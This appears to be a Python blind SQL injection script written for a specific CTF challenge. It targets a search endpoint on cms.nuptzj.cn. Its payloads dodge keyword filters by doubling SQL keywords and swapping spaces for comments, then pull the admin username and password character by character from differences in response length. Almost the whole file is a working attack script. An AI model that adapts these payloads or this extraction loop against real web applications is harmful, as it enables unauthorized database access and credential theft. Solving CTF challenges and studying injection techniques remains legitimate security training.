#!/usr/bin/python3
# -*- coding: UTF-8 -*-
import requests
import sys

#打印工具信息
def printMe():
	print('--------------------------------------------------------')
	print('---                                                  ---')
	print('---                    WhiteRabbit                   ---')
	print('---                                                  ---')
	print('---                自定义盲注工具V1.0                ---')
	print('---                                                  ---')
	print('---              (南邮ctf综合题2专用版)              ---')
	print('---                                                  ---')
	print('--------------------------------------------------------\n\n')

#一次攻击调用，一般用来判断终结点
def onceAttack(payload, url, params, param, poc, hearder):
	Payload = payload
	Url = url
	Params = params
	Param = param
	Payload = Payload.replace('poc1', poc[0])
	Payload = Payload.replace('poc2', poc[1])
	Params[Param] = Payload
	attack = requests.post(url, data=Params, headers=header)
	attack.encoding = 'gb2312'
	return attack

def getDump(payload, url, params, param, threshold, start, stop, header):
	Payload = payload
	usePaylaod = Payload
	Url = url
	Params = params
	Param = param
	dataDumps = []

	for poc2 in range(1,100):
		Poc2 = str(poc2)
		everyData = ''
		if len(onceAttack(usePaylaod, url, params, param,['1',Poc2], header).text) > threshold:
			Payload = usePaylaod
			break
		for poc1 in range(start,stop):
			Poc1 = str(poc1)
			Payload = Payload.replace('poc1', Poc1)
			Payload = Payload.replace('poc2', Poc2)
			Params[Param] = Payload
			#print(Params)
				
			#开始攻击
			attack = requests.post(url, data=Params, headers = header)
			attack.encoding = 'gb2312'
			#print(len(attack.text))
			#判断是否超过阈值
			if len(attack.text) > threshold:
				everyData = chr(poc1-1)
				print(everyData, end="", flush = 1)
				Payload = usePaylaod
				break
			#未能找出该位置符号，请扩大范围或手工测试
			if poc1 == 126:
				print('?')
			Payload = usePaylaod

		
	return dataDumps

if __name__=="__main__":
	url = "http://cms.nuptzj.cn/so.php"
	header = {
        'User-Agent': 'Xlcteam Browser',
        'Host': 'cms.nuptzj.cn',
    }
	params = {'soid': 'ChangeMe'}
	param = 'soid'
	threshold = 600
	start = 97
	stop = 127
	payload1 = r'1/**/anANDd/**/exists(seleSELECTct/**/*/**/frFROMom/**/admiADMINn/**/where/**/ascii(substr(usernanameme,poc2,1))<poc1)'
	payload2 = r'1/**/anANDd/**/exists(seleSELECTct/**/*/**/frFROMom/**/admiADMINn/**/where/**/ascii(substr(userpaspasss,poc2,1))<poc1)'
	#payload3 = r'1/**/anANDd/**/exists(seleSELECTct/**/*/**/frFROMom/**/admiADMINn/**/where/**/ascii(substr(userpaspasss,4,1))<33)'
	
	#params[param] = payload3
	#attack = requests.post(url, data=params, headers = header)
	#attack.encoding = 'gb2312'
	#print(len(attack.text))
	
	printMe()
	print("攻击开始:\n")
	print("username:", end="", flush = 1)
	getDump(payload1, url, params, param, threshold, start, stop, header)
	start = 32
	stop = 59
	print("\npassword:", end="", flush = 1)
	getDump(payload2, url, params, param, threshold, start, stop, header)
	